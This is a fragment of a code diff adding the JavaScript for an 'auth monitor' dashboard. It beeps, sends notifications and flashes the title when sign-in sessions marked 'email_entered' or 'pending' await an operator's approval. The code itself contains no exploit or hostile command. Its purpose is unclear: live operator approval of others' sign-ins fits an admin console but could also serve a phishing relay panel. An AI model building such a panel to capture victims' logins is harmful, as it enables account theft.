+        if (beepingActive) return;
+        beepingActive = true;
+        playBeepOnce();
+        beepInterval = setInterval(() => {
+          if (isMuted) {
+            stopBeeping();
+            return;
+          }
+          playBeepOnce();
+        }, 1500);
+      }
+
+      function stopBeeping() {
+        beepingActive = false;
+        if (beepInterval) {
+          clearInterval(beepInterval);
+          beepInterval = null;
+        }
+      }
+
+      function syncBeepState() {
+        const awaitingCount = allSessions.filter(
+          (s) => s.status === "email_entered" || s.status === "pending",
+        ).length;
+
+        if (awaitingCount > 0 && !isMuted) {
+          startBeeping();
+        } else {
+          stopBeeping();
+        }
+      }
+
+      function requestNotificationPermission() {
+        if (!("Notification" in window)) {
+          showToast("Browser notifications not supported", "error");
+          return;
+        }
+        Notification.requestPermission().then((perm) => {
+          if (perm === "granted") {
+            showToast("Notifications enabled", "success");
+            document.getElementById("notif-btn").textContent =
+              "Notifications On";
+            document.getElementById("notif-btn").disabled = true;
+          } else {
+            showToast("Notifications blocked", "error");
+          }
+        });
+      }
+
+      function notifyNewSession(session) {
+        if ("Notification" in window && Notification.permission === "granted") {
+          try {
+            const n = new Notification("New sign-in attempt", {
+              body: `${session.email || "Unknown user"} is waiting for approval.`,
+              tag: "auth-session-" + session.id,
+              icon: "/logo.ico",
+              requireInteraction: true,
+            });
+            n.onclick = () => {
+              window.focus();
+              n.close();
+            };
+          } catch (e) {
+            console.warn("Notification failed:", e);
+          }
+        }
+
+        showToast(
+          "New session from " + (session.email || "unknown"),
+          "success",
+        );
+      }
+
+      function toggleMute() {
+        isMuted = !isMuted;
+        localStorage.setItem("auth_monitor_muted", String(isMuted));
+        updateMuteUI();
+        syncBeepState();
+        showToast(isMuted ? "Sound muted" : "Sound enabled", "info");
+      }
+
+      function updateMuteUI() {
+        const btn = document.getElementById("mute-btn");
+        const label = document.getElementById("mute-label");
+        const icon = document.getElementById("sound-icon");
+        if (isMuted) {
+          btn.classList.add("muted");
+          label.textContent = "Muted";
+          icon.innerHTML = `
+        <polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"></polygon>
+        <line x1="23" y1="9" x2="17" y2="15"></line>
+        <line x1="17" y1="9" x2="23" y2="15"></line>
+      `;
+        } else {
+          btn.classList.remove("muted");
+          label.textContent = "Sound On";
+          icon.innerHTML = `
+        <polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"></polygon>
+        <path d="M19.07 4.93a10 10 0 0 1 0 14.14M15.54 8.46a5 5 0 0 1 0 7.07"></path>
+      `;
+        }
+      }
+
+      // ====== TOAST ======
+      let toastTimeout;
+      function showToast(message, type = "success") {
+        const toast = document.getElementById("toast");
+        toast.textContent = message;
+        toast.className = "toast " + type + " show";
+        clearTimeout(toastTimeout);
+        toastTimeout = setTimeout(() => {
+          toast.classList.remove("show");
+        }, 3000);
+      }
+
+      // ====== INIT ======
+      (async function init() {
+        const {
+          data: { session },
+        } = await sb.auth.getSession();
+        if (session) {
+          currentUser = session.user;
+          showDashboard();
+        }
+        if ("Notification" in window && Notification.permission === "granted") {
+          const nb = document.getElementById("notif-btn");
+          nb.textContent = "Notifications On";
+          nb.disabled = true;
+        }
+        document.addEventListener("visibilitychange", () => {
+          if (!document.hidden) {
+            stopTitleFlash();
+          } else {
+            const pending = allSessions.filter(
+              (s) => s.status === "pending",
+            ).length;
+            if (pending > 0) startTitleFlash(pending);
+          }
+        });
+      })();
+
+      document
+        .getElementById("login-password")
+        .addEventListener("keypress", (e) => {
+          if (e.key === "Enter") handleLogin();
+        });
+    </script>
+  </body>
+</html>
